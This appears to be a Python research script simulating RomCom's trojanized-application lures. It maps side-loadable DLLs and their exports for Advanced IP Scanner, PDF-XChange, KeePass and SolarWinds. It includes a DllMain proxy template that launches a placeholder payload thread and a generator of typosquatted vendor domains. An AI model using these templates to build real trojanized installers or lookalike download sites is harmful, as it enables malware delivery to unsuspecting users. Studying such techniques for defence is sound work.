# RomCom (Storm-0978) - Trojanized Application Lure Generator
# Demonstrates creation of trojanized software packages (DLL side-loading)
# MITRE ATT&CK: T1036.005 (Match Legitimate Name), T1574.002 (DLL Side-Loading)

# For educational and research purposes only
# Author: Nour A
# Reference: https://blogs.blackberry.com/en/2023/07/romcom-targets-ukraine

import os
import sys
import struct
import hashlib
import zipfile
import io
import shutil
import json
import time
from datetime import datetime

# PE file format constants
IMAGE_DOS_SIGNATURE = 0x5A4D  # MZ
IMAGE_NT_SIGNATURE = 0x00004550  # PE\0\0
IMAGE_FILE_MACHINE_AMD64 = 0x8664
IMAGE_FILE_EXECUTABLE_IMAGE = 0x0002
IMAGE_FILE_DLL = 0x2000


def build_pe_header(is_dll=False):
    """Build a minimal PE header (for demonstration).
    RomCom deploys trojanized versions of legitimate software with
    malicious DLLs side-loaded alongside the real executable.
    """
    # DOS header
    dos_header = struct.pack("<H", IMAGE_DOS_SIGNATURE)  # e_magic
    dos_header += b"\x00" * 58  # padding
    dos_header += struct.pack("<I", 64)  # e_lfanew (PE header offset)

    # PE signature
    pe_sig = struct.pack("<I", IMAGE_NT_SIGNATURE)

    # COFF header
    characteristics = IMAGE_FILE_EXECUTABLE_IMAGE
    if is_dll:
        characteristics |= IMAGE_FILE_DLL

    coff_header = struct.pack("<HHIIIHH",
                              IMAGE_FILE_MACHINE_AMD64,  # Machine
                              1,    # NumberOfSections
                              int(time.time()),  # TimeDateStamp
                              0,    # PointerToSymbolTable
                              0,    # NumberOfSymbols
                              240,  # SizeOfOptionalHeader
                              characteristics)

    return dos_header + pe_sig + coff_header


def build_dll_export_table(dll_name, exports):
    """Build a PE export directory table.
    The malicious DLL exports the same functions as the legitimate one
    to enable transparent DLL side-loading.
    """
    export_info = {
        "dll_name": dll_name,
        "exports": exports,
        "ordinal_base": 1,
        "description": "Matches legitimate DLL export table for side-loading"
    }
    return export_info


class TrojanizedApp:
    """Represents a trojanized application package.
    RomCom distributes trojanized versions of legitimate software
    (e.g., Advanced IP Scanner, PDF Reader, KeePass, SolarWinds NPM).
    """

    # known trojanized applications used by RomCom
    TARGETS = {
        "Advanced IP Scanner": {
            "legitimate_exe": "advanced_ip_scanner.exe",
            "side_load_dll": "winmm.dll",
            "dll_exports": [
                "PlaySoundW", "waveOutOpen", "waveOutClose",
                "midiOutOpen", "midiOutShortMsg", "timeGetTime"
            ],
            "version": "2.5.4594.1",
            "publisher": "Famatech Corp.",
        },
        "PDF-XChange Editor": {
            "legitimate_exe": "PDFXEdit.exe",
            "side_load_dll": "version.dll",
            "dll_exports": [
                "GetFileVersionInfoA", "GetFileVersionInfoSizeA",
                "GetFileVersionInfoW", "GetFileVersionInfoSizeW",
                "VerQueryValueA", "VerQueryValueW"
            ],
            "version": "9.5.366.0",
            "publisher": "Tracker Software Products",
        },
        "KeePass": {
            "legitimate_exe": "KeePass.exe",
            "side_load_dll": "ShFolder.dll",
            "dll_exports": [
                "SHGetFolderPathA", "SHGetFolderPathW",
                "SHGetSpecialFolderPathA"
            ],
            "version": "2.54",
            "publisher": "Dominik Reichl",
        },
        "SolarWinds NPM": {
            "legitimate_exe": "OrionWeb.exe",
            "side_load_dll": "cscapi.dll",
            "dll_exports": [
                "CscSearchApiGetInterface",
                "CscNetApiGetInterface"
            ],
            "version": "2023.4",
            "publisher": "SolarWinds",
        },
    }

    def __init__(self, app_name):
        if app_name not in self.TARGETS:
            raise ValueError(f"Unknown target: {app_name}")
        self.app_name = app_name
        self.config = self.TARGETS[app_name]

    def generate_sideload_dll(self):
        """Generate the malicious DLL structure for side-loading.
        The DLL proxies legitimate exports while executing payload.
        """
        dll_header = build_pe_header(is_dll=True)
        exports = build_dll_export_table(
            self.config["side_load_dll"],
            self.config["dll_exports"]
        )

        # DLL entry point (DllMain) would execute the payload
        dll_main_concept = f"""
// DllMain - executed when the legitimate app loads this DLL
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {{
    if (fdwReason == DLL_PROCESS_ATTACH) {{
        DisableThreadLibraryCalls(hinstDLL);
        // load the real {self.config['side_load_dll']} from System32
        LoadRealDLL();
        // execute payload in a new thread to avoid blocking
        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
    }}
    return TRUE;
}}

// proxy function example
MMRESULT WINAPI {self.config['dll_exports'][0]}(/* params */) {{
    // forward to the real DLL function
    return real_{self.config['dll_exports'][0]}(/* params */);
}}
"""

        return {
            "pe_header": dll_header,
            "exports": exports,
            "dll_main": dll_main_concept,
            "filename": self.config["side_load_dll"],
            "header_size": len(dll_header)
        }

    def generate_manifest(self):
        """Generate an application manifest matching the legitimate app."""
        manifest = f"""<?xml version="1.0" encoding="UTF-8"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <assemblyIdentity
    type="win32"
    name="{self.config['legitimate_exe']}"
    version="{self.config['version']}"
    processorArchitecture="amd64"
  />
  <description>{self.app_name} - {self.config['publisher']}</description>
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
    <application>
      <supportedOS Id="{{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}}"/>
    </application>
  </compatibility>
</assembly>"""
        return manifest

    def package_trojanized_app(self, output_dir=None):
        """Package the trojanized application into a ZIP/ISO-like structure."""
        if output_dir is None:
            output_dir = os.path.join(os.environ.get("TEMP", "."),
                                      "romcom_staging")

        package_info = {
            "app_name": self.app_name,
            "files": [],
            "total_size": 0,
        }

        # generate components
        dll_info = self.generate_sideload_dll()
        manifest = self.generate_manifest()

        package_info["files"] = [
            {
                "name": self.config["legitimate_exe"],
                "type": "legitimate_binary",
                "description": f"Real {self.app_name} executable"
            },
            {
                "name": dll_info["filename"],
                "type": "malicious_dll",
                "exports": len(dll_info["exports"]["exports"]),
                "description": "Side-loading DLL with proxied exports"
            },
            {
                "name": f"{self.config['legitimate_exe']}.manifest",
                "type": "manifest",
                "description": "Application manifest for compatibility"
            },
            {
                "name": "setup.exe",
                "type": "dropper",
                "description": "NSIs installer that deploys the package"
            },
        ]

        return package_info

    def generate_download_site(self):
        """Generate info about the typosquatted download site.
        RomCom hosts these on domains mimicking the real software vendor.
        """
        legit_domain = self.config["publisher"].lower().replace(" ", "") + ".com"
        fake_domains = [
            legit_domain.replace(".com", "-download.com"),
            "get" + legit_domain,
            legit_domain.replace(".com", "-free.com"),
        ]

        return {
            "legitimate_domain": legit_domain,
            "phishing_domains": fake_domains,
            "ssl_cert": f"Let's Encrypt for {fake_domains[0]}",
            "hosting": "Cloudflare (for legitimacy)",
        }


def main():
    print("=" * 70)
    print("ROMCOM (STORM-0978) TROJANIZED APPLICATION GENERATOR")
    print("DLL Side-Loading Attack Package Simulation")
    print("=" * 70)
    print()
    print("[!] FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY")
    print()

    for app_name in TrojanizedApp.TARGETS:
        print(f"[TARGET] {app_name}")
        print("-" * 50)

        trojan = TrojanizedApp(app_name)

        # DLL side-loading info
        dll = trojan.generate_sideload_dll()
        print(f"  Legitimate EXE: {trojan.config['legitimate_exe']}")
        print(f"  Malicious DLL: {dll['filename']}")
        print(f"  DLL Exports ({len(dll['exports']['exports'])}):")
        for exp in dll["exports"]["exports"]:
            print(f"    - {exp}()")
        print(f"  PE Header: {dll['header_size']} bytes")

        # packaging info
        pkg = trojan.package_trojanized_app()
        print(f"  Package files:")
        for f in pkg["files"]:
            print(f"    [{f['type']}] {f['name']}")

        # download site
        site = trojan.generate_download_site()
        print(f"  Phishing domains:")
        for domain in site["phishing_domains"]:
            print(f"    - {domain}")

        print()

    print("=" * 70)
    print("[+] TROJANIZED APPLICATION SIMULATION COMPLETE")
    print("  Techniques demonstrated:")
    print("  - PE header construction for DLL analysis")
    print("  - DLL export table matching for side-loading")
    print("  - Application manifest generation")
    print("  - Typosquatted download domain generation")
    print("  - NSIS installer packaging concept")
    print("=" * 70)


if __name__ == "__main__":
    main()
